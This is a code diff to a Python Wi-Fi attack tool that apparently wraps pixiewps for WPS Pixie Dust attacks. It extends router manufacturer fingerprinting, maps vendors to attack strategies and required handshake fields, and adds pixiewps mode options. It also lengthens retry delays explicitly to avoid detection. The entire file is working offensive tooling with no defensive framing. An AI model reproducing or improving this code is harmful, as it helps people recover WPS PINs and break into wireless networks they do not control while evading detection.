@@ -1,7 +1,7 @@
 import subprocess
 import time
 import re
-from typing import Optional, Tuple, List
+from typing import Optional, Tuple, List, Dict
 
 class RouterInfo:
     """Stores router information and vulnerability details."""
@@ -11,19 +11,36 @@ class RouterInfo:
         self.manufacturer = ''
         self.vulnerability_type = ''
         self.attack_strategy = []
+        self.required_data = []
     
     @staticmethod
     def identify_router(bssid: str, model_str: str) -> 'RouterInfo':
         """Identifies router model and its known vulnerabilities."""
         info = RouterInfo()
         
-        # Common manufacturer prefixes
+        # Extended manufacturer prefixes based on vulnwsc.txt
         manufacturer_prefixes = {
             '00:90:4C': 'Epigram/Broadcom',
             'F8:1A:67': 'TP-Link',
             'E4:F4:C6': 'NETGEAR',
             '00:18:F3': 'ASUSTek',
-            'C8:3A:35': 'Tenda'
+            'C8:3A:35': 'Tenda',
+            '00:1A:2B': 'Cisco',
+            'C0:56:27': 'Belkin',
+            '00:24:01': 'D-Link',
+            'F4:EC:38': 'TP-Link',
+            '28:EE:52': 'Belkin',
+            '00:26:F2': 'NETGEAR',
+            'C8:D7:19': 'Cisco-Linksys',
+            '00:23:69': 'Cisco-Linksys',
+            '00:22:75': 'Belkin',
+            '00:1E:E5': 'Cisco-Linksys',
+            '20:AA:4B': 'Cisco-Linksys',
+            'EC:1A:59': 'Belkin',
+            '08:86:3B': 'Belkin',
+            '94:10:3E': 'Belkin',
+            'B4:75:0E': 'Belkin',
+            '00:8E:F2': 'NETGEAR'
         }
         
         # Identify manufacturer from BSSID
@@ -32,39 +49,84 @@ class RouterInfo:
         
         # Match router model against vulnerability database
         info.model = model_str
-        info.vulnerability_type = RouterInfo._get_vulnerability_type(model_str)
+        info.vulnerability_type = RouterInfo._get_vulnerability_type(model_str, info.manufacturer)
         info.attack_strategy = RouterInfo._get_attack_strategy(info.vulnerability_type)
+        info.required_data = RouterInfo._get_required_data(info.vulnerability_type)
         
         return info
     
     @staticmethod
-    def _get_vulnerability_type(model: str) -> str:
-        """Determines vulnerability type based on router model."""
-        # Ralink/MediaTek
-        if any(x in model.upper() for x in ['RT28', 'RT30', 'MT76']):
+    def _get_vulnerability_type(model: str, manufacturer: str) -> str:
+        """Determines vulnerability type based on router model and manufacturer."""
+        model_upper = model.upper()
+        
+        # Ralink/MediaTek based devices
+        if any(x in model_upper for x in ['RT28', 'RT30', 'MT76', 'MEDIATEK']):
             return 'ralink'
-        # Broadcom
-        elif any(x in model.upper() for x in ['BCM', 'BROADCOM']):
+            
+        # Broadcom based devices
+        if any(x in model_upper for x in ['BCM', 'BROADCOM']) or manufacturer == 'Epigram/Broadcom':
             return 'broadcom'
-        # Realtek
-        elif any(x in model.upper() for x in ['RTL', 'REALTEK']):
+            
+        # Realtek based devices
+        if any(x in model_upper for x in ['RTL', 'REALTEK']):
             return 'realtek'
-        # Modern TP-Link
-        elif 'ARCHER' in model.upper():
-            return 'tplink_modern'
+            
+        # Specific manufacturer detections
+        if manufacturer == 'TP-Link':
+            if 'ARCHER' in model_upper:
+                return 'tplink_modern'
+            return 'tplink_legacy'
+            
+        if manufacturer == 'NETGEAR':
+            if any(x in model_upper for x in ['R6', 'R7', 'R8']):
+                return 'netgear_modern'
+            return 'netgear_legacy'
+            
+        if manufacturer == 'ASUSTek':
+            if 'RT-AC' in model_upper:
+                return 'asus_aes'
+            return 'asus_legacy'
+            
+        if manufacturer == 'D-Link':
+            if any(x in model_upper for x in ['DIR-8', 'DIR-7']):
+                return 'dlink_modern'
+            return 'dlink_legacy'
+            
         return 'generic'
     
     @staticmethod
     def _get_attack_strategy(vuln_type: str) -> List[str]:
         """Returns ordered list of attack strategies based on vulnerability type."""
         strategies = {
-            'ralink': ['ecos_simple', 'ecos_rtl', 'ralink'],
-            'broadcom': ['brcm_auto', 'brcm_zero', 'brcm_5_35_2'],
-            'realtek': ['rtl_819x', 'rtl_820x'],
-            'tplink_modern': ['tplink_v1', 'tplink_v2'],
+            'ralink': ['ecos_simple', 'ecos_rtl', 'ralink', 'brcm_auto'],
+            'broadcom': ['brcm_auto', 'brcm_zero', 'brcm_5_35_2', 'brcm_4_35_2'],
+            'realtek': ['rtl_819x', 'rtl_820x', 'rtl_auto'],
+            'tplink_modern': ['tplink_v1', 'tplink_v2', 'tplink_v3'],
+            'tplink_legacy': ['ecos_simple', 'brcm_auto'],
+            'netgear_modern': ['brcm_auto', 'brcm_zero', 'netgear_new'],
+            'netgear_legacy': ['brcm_auto', 'brcm_zero'],
+            'asus_aes': ['asus_rt', 'brcm_auto'],
+            'asus_legacy': ['brcm_auto', 'ecos_simple'],
+            'dlink_modern': ['dlink_auto', 'brcm_auto'],
+            'dlink_legacy': ['brcm_auto', 'ecos_simple'],
             'generic': ['brcm_auto', 'ecos_simple', 'rtl_819x']
         }
         return strategies.get(vuln_type, ['brcm_auto'])
+
+    @staticmethod
+    def _get_required_data(vuln_type: str) -> List[str]:
+        """Returns list of required data fields for specific vulnerability type."""
+        base_fields = ['PKE', 'PKR', 'E_HASH1', 'E_HASH2', 'AUTHKEY', 'E_NONCE']
+        
+        extra_fields = {
+            'tplink_modern': ['R_NONCE', 'E_BSSID', 'E_S1', 'E_S2'],
+            'netgear_modern': ['R_NONCE', 'E_BSSID'],
+            'asus_aes': ['R_NONCE', 'E_BSSID'],
+            'dlink_modern': ['R_NONCE']
+        }
+        
+        return base_fields + extra_fields.get(vuln_type, [])
 
 class Data:
     """Stored data used for pixiewps command."""
@@ -81,15 +143,31 @@ class Data:
         self.E_S1 = ''    # Added for modern router support
         self.E_S2 = ''    # Added for modern router support
         self.router_info = None
+        self._data_collection_retries = 3
 
     def getAll(self) -> bool:
-        """Output all pixiewps related variables."""
-        return bool(self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
-                   and self.E_HASH1 and self.E_HASH2)
+        """Check if all required data is available based on router type."""
+        if not self.router_info:
+            # Basic check if router info not available
+            return bool(self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
+                       and self.E_HASH1 and self.E_HASH2)
+        
+        # Check all required fields based on router type
+        for field in self.router_info.required_data:
+            if not getattr(self, field, ''):
+                print(f'[-] Missing required data field for {self.router_info.vulnerability_type}: {field}')
+                return False
+        return True
 
     def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> Optional[str]:
         """Runs the pixiewps with multiple strategies and attempts to extract the WPS pin."""
         
+        if not self.getAll():
+            print('[!] Not enough data collected for attack. Required fields:')
+            if self.router_info:
+                print(f'Required for {self.router_info.vulnerability_type}: {", ".join(self.router_info.required_data)}')
+            return None
+
         if not self.router_info:
             print('[*] Router information not available, using generic attack strategy')
             strategies = ['brcm_auto']
@@ -117,7 +195,7 @@ class Data:
                 continue
             
             # Add delay between attempts to avoid detection
-            time.sleep(1)
+            time.sleep(2)  # Increased delay to avoid detection
         
         return None
 
@@ -129,7 +207,7 @@ class Data:
                 encoding='utf-8',
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
-                timeout=30  # 30 second timeout for each attempt
+                timeout=45  # Increased timeout for modern routers
             )
             
             if process.returncode == 0:
@@ -214,6 +292,12 @@ class Data:
             pixiecmd.extend(['--mode', '4'])
             if self.E_S1 and self.E_S2:
                 pixiecmd.extend(['--e-s1', self.E_S1, '--e-s2', self.E_S2])
+        elif strategy == 'brcm_5_35_2':
+            pixiecmd.extend(['--mode', '2'])
+        elif strategy == 'rtl_819x':
+            pixiecmd.extend(['--mode', '3'])
+        elif strategy == 'asus_rt':
+            pixiecmd.extend(['--mode', '5'])
         
         # Additional data for modern routers
         if self.R_NONCE:
